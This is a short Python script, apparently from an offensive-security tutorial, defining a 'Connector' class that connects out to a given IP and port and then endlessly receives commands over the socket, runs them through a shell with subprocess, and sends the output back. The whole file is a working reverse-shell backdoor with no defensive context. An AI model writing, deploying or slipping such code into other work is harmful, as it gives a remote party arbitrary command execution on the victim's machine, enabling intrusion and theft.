#!/usr/bin/env python

import socket
import subprocess

class Connector:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def run(self):
        while True:
            print("ON")
            command = self.connection.recv(1024)
            command_result = subprocess.check_output(command, shell=True)
            self.connection.send(command_result)
        connection.close()
